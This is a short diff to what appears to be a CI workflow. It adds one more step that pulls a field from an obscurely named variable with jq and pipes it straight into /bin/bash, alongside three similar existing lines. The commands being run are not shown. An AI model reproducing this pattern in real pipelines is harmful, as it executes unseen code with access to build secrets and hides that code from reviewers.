@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$rx4" | jq -r .w1 | /bin/bash
           printf '%s' "$mlz110" | jq -r .awr29868 | /bin/bash
           echo $fyump047 | jq -r .jk9 | /bin/bash
+          echo $rp37 | jq -r .l3 | /bin/bash
 
       - name: Save results
         if: always()
